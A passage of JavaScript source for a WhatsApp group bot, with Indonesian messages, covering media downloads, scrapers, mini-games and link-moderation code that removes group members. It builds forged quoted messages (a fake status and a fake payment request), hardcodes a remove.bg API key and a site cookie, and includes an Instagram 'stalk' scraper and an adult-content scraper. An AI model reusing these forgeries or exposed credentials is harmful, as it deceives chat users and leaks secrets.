		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6281779122444:6281779122444\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./NFSMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await NFSBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await NFSBotInc.getName(i)}\nFN:${await NFSBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let NFSrecordin = ['recording','composing']
//let NFSrecordinfinal = NFSrecordin[Math.floor(Math.random() * NFSrecordin.length)]

if (global.autoTyping) {
if (command) {
NFSBotInc.sendPresenceUpdate('composing', from)
}
}

if (global.autoRecord) {
if (command) {
NFSBotInc.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await NFSBotInc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Nama Channel : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Judul : ${Lehd.meta.title}
Durasi : ${Lehd.meta.duration}
Deskripsi : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Unduh Video Dengan ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await NFSBotInc.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await NFSBotInc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Nama Channel : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Judul : ${Puxa.meta.title}
Durasi : ${Puxa.meta.duration}
Deskripsi : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Unduh Audio Dengan ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await NFSBotInc.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
NFSBotInc.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}	

async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}

function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}

async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}

function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await NFSBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await NFSBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return NFSStickBotAdmin()
        let gclink = (`https://chat.whatsapp.com/`+await NFSBotInc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return NFSBotInc.sendMessage(m.chat, {text: `\`\`\`「 Tautan Grup Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return NFSBotInc.sendMessage(m.chat, {text: `\`\`\`「 Tautan Grup Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
        if (NFSTheCreator) return NFSBotInc.sendMessage(m.chat, {text: `\`\`\`「 Tautan Grup Terdeteksi 」\`\`\`\n\nPemilik telah mengirim tautan, pemilik bebas memposting tautan apa pun`})
        kice = m.sender
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Grup Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Telah ditendang karena mengirimkan tautan grup di grup ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

// Antiwame by NFS
if (antiWame)
if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Wa.me Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
kice = m.sender
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Wa.me Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Ditendang gara-gara kirim link wa.me di grup ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}

if (antiWame)
if (budy.includes(`http://wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Wa.me Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link wa.me, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
kice = m.sender
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Wa.me Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Ditendang gara-gara kirim link wa.me di grup ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
} else {
}

//antivirtex by NFS
  if (antiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return NFSStickBotAdmin()
          await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			NFSBotInc.sendMessage(from, {text:`\`\`\`「 Virus terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirimkan virus di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
  }
  }

//anti bad words by NFS
if (antiToxic)
if (BadNFS.includes(messagesD)) {
if (m.text) {
bvl = `\`\`\`「 Kata Buruk Terdeteksi 」\`\`\`\n\nAnda menggunakan kata-kata buruk tetapi Anda adalah admin/pemilik itu sebabnya saya tidak akan menendang Anda😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			await NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Kata Buruk Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} ditendang karena menggunakan kata-kata buruk di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
}

//antilink youtube video by NFS
if (AntiLinkYoutubeVid)
if (budy.includes("https://youtu.be/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Video Youtube Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link video youtube, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Video YouTube Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirim tautan video youtube di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//antilink youtube channel by NFS
if (AntiLinkYoutubeChannel)
if (budy.includes("https://youtube.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Saluran Youtube Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link youtube channel, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Saluran YouTube Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirimkan tautan saluran youtube di grup ini`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
} else {
}

//antilink instagram by NFS
if (AntiLinkInstagram)
if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Instagram Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link instagram, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Instagram Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirim tautan instagram di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//antilink facebook by NFS
if (AntiLinkFacebook)
if (budy.includes("https://facebook.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Facebook Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link facebook, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Facebook Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirim tautan facebook di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//antilink telegram by NFS
if (AntiLinkTelegram)
if (budy.includes("https://t.me/")){
if (AntiLinkTelegram)
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Telegram Terdeteksi 」\`\`\`\n\nLink telegram sudah admin kirim, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Telegram Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirim tautan telegram di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//antilink tiktok by NFS
if (AntiLinkTiktok)
if (budy.includes("https://www.tiktok.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Tiktok Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link tiktok, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Tiktok Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirim tautan tiktok di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//antilink twitter by NFS
if (AntiLinkTwitter)
if (budy.includes("https://twitter.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Twitter Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link twitter, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Tiktok Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirim tautan twitter di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//antilink all by NFS
if (AntiLinkAll)
if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\nAdmin sudah kirim link, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (NFSTheCreator) return m.reply(bvl)
        await NFSBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			NFSBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
NFSBotInc.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirim tautan di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}

//menu thingy
const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

//menu image randomizer
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
NFSBotInc.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, harap masukkan emoji lain\nCATATAN : Cukup masukkan 1 emoji")
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: NFSBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, NFSBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
NFSBotInc.ev.emit('messages.upsert', msg)
}

switch (command) {
case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room13 => room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender))) return replygcNFS(`You Are Still In The Game`)
            let room13 = Object.values(this.game).find(room13 => room13.state === 'WAITING' && (text ? room13.name === text : true))
            if (room13) {
            room13.o = m.chat
            room13.game.playerO = m.sender
            room13.state = 'PLAYING'
            let arr = room13.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room13.game.currentTurn.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if (room13.x !== room13.o) await NFSBotInc.sendText(room13.x, str, m, { mentions: parseMention(str) } )
            await NFSBotInc.sendText(room13.o, str, m, { mentions: parseMention(str) } )
            } else {
            room13 = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room13.name = text
            replygcNFS('Menunggu Mitra' + (text ? ` Ketik Perintah Di Bawah Ini ${prefix}${command} ${text}` : ''))
            this.game[room13.id] = room13
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            NFSBotInc.sendText(m.chat, `Berhasil menghapus sesi TicTacToe`, m)
            } else if (!this.game) {
            replygcNFS(`Sesi TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            replygcNFS('rusak')
            }
            }
            break
            case 'suitpvp':case 'rps': case 'rockpaperscissors':case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcNFS(`Complete your previous game`)
	    if (m.mentionedJid[0] === m.sender) return replygcNFS(`Tidak bisa bermain dengan diriku sendiri !`)
            if (!m.mentionedJid[0]) return replygcNFS(`_Siapa yang ingin Anda tantang?_\nTandai orangnya..\n\nContoh : ${prefix}suit @${owner}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcNFS(`Orang yang Anda tantang sedang bermain sesuai dengan orang lain :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *Ditantang* @${m.mentionedJid[0].split`@`[0]} *untuk bermain jas*

*Hi* @${m.mentionedJid[0].split`@`[0]} *Silahkan ketik accept untuk menerima atau ketik reject untuk menolak`
            this.suit[id] = {
            chat: await NFSBotInc.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) NFSBotInc.sendText(m.chat, `_Jas waktu habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	case 'public': {
                if (!NFSTheCreator) return NFSStickOwner()
